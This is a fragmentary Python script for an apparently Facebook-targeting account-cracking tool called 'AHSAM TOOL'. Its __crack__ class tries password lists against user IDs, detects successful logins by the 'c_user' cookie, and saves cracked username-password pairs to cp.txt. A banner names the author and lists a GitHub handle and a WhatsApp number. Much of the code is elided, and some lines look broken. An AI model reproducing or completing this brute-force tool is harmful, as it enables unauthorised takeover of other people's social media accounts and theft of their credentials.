...
def main():
	...
	if Adi in ('0', '00'):
		exit('THANKS FOR USING AHSAM TOOL')  
	else:
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mAHSAM\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;37m[\033[1;31mAHSAM-CP\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('cp.txt','a').write('%s\n' % wrt)
				break
...
| $$  | $$| $$  | $$ \$$    $$| $$  | $$| $$  \$ | $$
 \$$   \$$ \$$   \$$  \$$$$$$  \$$   \$$ \$$      \$$                                                                                                                 
=================================================
    [-] AUTHOR    :\033[1;32m MR-AUH-BRAND
    [-] GITHUB    :\033[1;32m MR-AUH404
    [-] WhatsApp  :\033[1;32m 03411471937
